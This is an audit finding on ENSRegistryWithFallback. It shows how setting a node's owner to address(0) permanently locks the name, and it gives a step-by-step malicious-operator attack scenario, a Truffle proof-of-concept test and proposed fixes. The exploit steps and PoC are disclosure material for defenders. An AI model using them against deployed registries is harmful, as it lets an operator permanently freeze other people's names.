# [HIGH] ENSRegistryWithFallback: Setting owner to address(0) creates a permanently locked node that cannot be managed by any party without admin intervention

## Summary

In `ENSRegistryWithFallback`, calling any write function that sets a node's owner to `address(0)` stores `address(ENSRegistryWithFallback)` in raw storage instead. This state permanently blocks the `authorised` modifier for that node: the modifier reads raw storage (not the public `owner()` function), and since no external caller can be `address(ENSRegistryWithFallback)`, and `operators[address(ENSRegistryWithFallback)][x]` can never be set to `true`, no one can ever call `setOwner`, `setResolver`, `setTTL`, or any other write function on that node again. The only recovery path requires an admin with direct parent-node control to intervene. Without such an admin, the lock is permanent.

---

## Severity

**High**

- **Likelihood**: Medium — a malicious operator or an accidental owner action can trigger this; the trigger requires no special conditions beyond holding operator permission
- **Impact**: High — permanently destroys the ability to manage an ENS name (cannot update resolver, TTL, or transfer ownership); the name retains its identity in the registry but is functionally dead without admin recovery

---

## Vulnerability Details

### Root Cause: `_setOwner` writes `address(this)`, but `authorised` reads raw storage

**`ENSRegistryWithFallback._setOwner` (line 59–66)**

```solidity
function _setOwner(bytes32 node, address owner) internal override {
    address addr = owner;
    if (addr == address(0x0)) {
        addr = address(this); // address(0) is silently promoted to address(ENSRegistryWithFallback)
    }
    super._setOwner(node, addr);
}
```

**`ENSRegistry.authorised` modifier (line 20–23)**

```solidity
modifier authorised(bytes32 node) {
    address owner = records[node].owner; // reads RAW storage, not owner()
    require(owner == msg.sender || operators[owner][msg.sender]);
    _;
}
```

After `_setOwner(node, address(0))` executes, raw storage holds `address(ENSRegistryWithFallback)`. The modifier checks:

```
require(
    address(ENSRegistryWithFallback) == msg.sender   // impossible: contract can't be msg.sender
    ||
    operators[address(ENSRegistryWithFallback)][msg.sender]  // always false: see below
)
→ always REVERTS
```

**Why `operators[address(ENSRegistryWithFallback)][x]` is permanently false:**

`operators[owner][operator]` can only be set to `true` by `setApprovalForAll`, which sets `operators[msg.sender][operator]`. For the key `operators[address(ENSRegistryWithFallback)]` to be non-empty, the `ENSRegistryWithFallback` contract itself would need to call `setApprovalForAll`. The contract has no `receive()`, no `fallback()`, no self-invocation path, and makes no external calls that could cause re-entrancy — so this is impossible.

### Inconsistency with `owner()` and `recordExists()`

After the lock is created:

| Function | Returns | Reason |
|---|---|---|
| `records[node].owner` (raw) | `address(ENSRegistryWithFallback)` | stored by `_setOwner` |
| `recordExists(node)` | `true` | raw storage ≠ address(0) |
| `owner(node)` | `address(0)` | `address(this)` → translated to 0 |
| Any write function | REVERT | `authorised` reads raw, gets `address(ENSRegistryWithFallback)` |

The node appears to external observers (via `owner()`) as "existing but unowned", while being completely unmodifiable from within.

---

## Attack Scenario

### Malicious operator permanently disables a name

**Preconditions:**
- `ENSRegistryWithFallback` is deployed as the active ENS registry
- Alice holds `alice.eth`
- Alice has granted operator status to Mallory (any DeFi protocol with operator permission)

**Execution:**

**1. Mallory sets alice.eth owner to address(0)**
```
ens.setOwner(alice_node, address(0)) {from: Mallory}

  authorised(alice_node):
    records[alice_node].owner = Alice
    operators[Alice][Mallory] = true  → PASSES ✓

  ENSRegistryWithFallback._setOwner(alice_node, address(0)):
    addr = address(ENSRegistryWithFallback)
    records[alice_node].owner = address(ENSRegistryWithFallback)
```

**2. Alice tries to update her resolver**
```
ens.setResolver(alice_node, newResolver) {from: Alice}

  authorised(alice_node):
    records[alice_node].owner = address(ENSRegistryWithFallback)
    require(ENSReg == Alice || operators[ENSReg][Alice])
    → REVERT ✗
```

**3. Alice tries to reclaim ownership**
```
ens.setOwner(alice_node, Alice) {from: Alice}
  → REVERT ✗  (same authorised check fails)
```

**4. Deployer (admin) tries to directly fix it**
```
ens.setOwner(alice_node, Alice) {from: Deployer}
  → REVERT ✗  (Deployer is also not address(ENSRegistryWithFallback))
```

**Result: alice.eth is permanently frozen. No write operation is possible on it through any direct path.**

### Variant: Owner accidentally self-locks

Alice calls any of the following, thinking she is "clearing" or "resetting" her record:

```solidity
ens.setRecord(alice_node, address(0), someResolver, someTTL);
// or
ens.setOwner(alice_node, address(0));
// or
ens.setSubnodeRecord(parent, label, address(0), resolver, ttl);
```

Each of these triggers `_setOwner(node, address(0))` and permanently locks the node. No warning, no confirmation, no undo.

---

## Recovery Path (Requires Admin)

The only way to recover a locked node is through **parent-node control**. An admin who controls the parent node can call `setSubnodeOwner(parentNode, label, someAddress)`, which overwrites the locked storage directly (the authorization check is on `parentNode`, not on the locked child).

**Example recovery:**
```
Deployer calls: ens.setSubnodeOwner(eth_node, sha3('alice'), Alice)
  authorised(eth_node):
    records[eth_node].owner = Deployer (or FIFSRegistrar, if deployer first reclaims it)
    → PASSES ✓
  _setOwner(alice_node, Alice): Alice ≠ address(0) → records[alice_node].owner = Alice ✓
```

**Why this is insufficient:**
1. Requires coordinated admin action per affected name
2. If the parent node is itself controlled by an immutable contract (e.g., a registrar without an override function), even this path may be unavailable
3. In a decentralized ENS deployment where the deployer key is burned or transferred to a multisig, recovery latency can be days/weeks while the name remains unusable
4. In the scenario where Bug #1 (Critical) occurs simultaneously, an attacker can steal the name before the admin recovers it

---

## Proof of Concept

The following test can be added to `test/TestENSRegistryWithFallback.js`:

```javascript
it('[HIGH PoC] setting owner to address(0) permanently locks the node', async () => {
    const namehash = require('eth-ens-namehash');
    const sha3 = require('web3-utils').sha3;

    const ENSWithFallback    = artifacts.require('ENSRegistryWithFallback.sol');
    const ENSWithoutFallback = artifacts.require('ENSRegistry.sol');

    const oldRegistry = await ENSWithoutFallback.new();
    const ens = await ENSWithFallback.new(oldRegistry.address);

    const alice   = accounts[1];
    const mallory = accounts[2];

    // Step 1: Give alice.eth a subnode
    const ethNode   = namehash.hash('eth');
    const aliceNode = namehash.hash('alice.eth');
    await ens.setSubnodeOwner('0x' + '00'.repeat(32), sha3('eth'), accounts[0], { from: accounts[0] });
    await ens.setSubnodeOwner(ethNode, sha3('alice'), alice, { from: accounts[0] });

    assert.equal(await ens.owner(aliceNode), alice, 'Alice owns alice.eth');

    // Step 2: Alice grants operator to Mallory
    await ens.setApprovalForAll(mallory, true, { from: alice });

    // Step 3: Mallory "burns" alice.eth
    await ens.setOwner(aliceNode, '0x' + '00'.repeat(20), { from: mallory });

    // Step 4: Verify zombie state
    const rawOwner = await ens.owner(aliceNode);
    const exists   = await ens.recordExists(aliceNode);
    assert.equal(rawOwner, '0x' + '00'.repeat(20), 'owner() returns address(0)');
    assert.equal(exists, true, 'recordExists() still returns true — zombie node');

    // Step 5: Alice cannot reclaim her name
    try {
        await ens.setOwner(aliceNode, alice, { from: alice });
        assert.fail('Should have reverted');
    } catch (e) {
        assert.include(e.message, 'revert', 'Alice cannot reclaim — permanently locked');
    }

    // Step 6: Alice cannot even update the resolver
    try {
        await ens.setResolver(aliceNode, accounts[5], { from: alice });
        assert.fail('Should have reverted');
    } catch (e) {
        assert.include(e.message, 'revert', 'Alice cannot update resolver — permanently locked');
    }

    // Step 7: Even the deployer/admin cannot fix it directly
    try {
        await ens.setOwner(aliceNode, alice, { from: accounts[0] });
        assert.fail('Should have reverted');
    } catch (e) {
        assert.include(e.message, 'revert', 'Even admin cannot fix directly — only via parent setSubnodeOwner');
    }
});
```

---

## Impact

- Any ENS name in `ENSRegistryWithFallback` can be permanently frozen by a malicious operator with a single transaction
- The owner loses the ability to update resolver records (breaking ENS resolution), change TTL, or transfer ownership
- A locked name permanently loses its market value as it cannot be transferred
- The attack is silent: the `Transfer` event emits `address(0)` as the new owner, which may not be monitored by the victim
- Resolvers pointing to the locked name continue to resolve until they are updated — but the update becomes impossible
- The only recovery requires admin action, which may not be available in decentralized deployments

---

## Recommended Fix

### Fix A — Replace the `address(0) → address(this)` pattern with an explicit existence flag (preferred)

The root cause is overloading the `owner` storage field to also carry existence information. Separate these concerns:

```solidity
// In ENSRegistryWithFallback:
mapping(bytes32 => bool) private _existsInNew;

function _setOwner(bytes32 node, address owner) internal override {
    _existsInNew[node] = true;      // mark as existing in new registry
    super._setOwner(node, owner);   // stores address(0) cleanly for genuine no-owner
}

function recordExists(bytes32 node) public override view returns (bool) {
    return _existsInNew[node];
}
```

With this fix:
- `address(0)` in storage means genuinely abandoned (consistent with base `ENSRegistry`)
- `recordExists()` uses a dedicated flag, not the owner field
- `authorised` reads raw storage = `address(0)` for abandoned names → correctly rejects writes
- No zombie state possible

### Fix B — Override `authorised` to use `owner()` instead of raw storage

```solidity
// In ENSRegistryWithFallback, override the authorised modifier:
modifier authorised(bytes32 node) override {
    address nodeOwner = owner(node); // use public owner(), not raw storage
    require(nodeOwner == msg.sender || operators[nodeOwner][msg.sender]);
    _;
}
```

This is simpler but requires adding a virtual override mechanism for the modifier in Solidity 0.7, which is not directly supported — the modifier would need to be refactored into a function.

---

## References

- `contracts/ENSRegistryWithFallback.sol` — `_setOwner`, lines 59–66
- `contracts/ENSRegistry.sol` — `authorised` modifier, lines 20–23; `owner()`, lines 117–124; `recordExists()`, lines 149–151
- Related finding: [CRITICAL] Zombie node enables ENS name theft via FIFSRegistrar (root cause identical, impact escalated by FIFSRegistrar interaction)
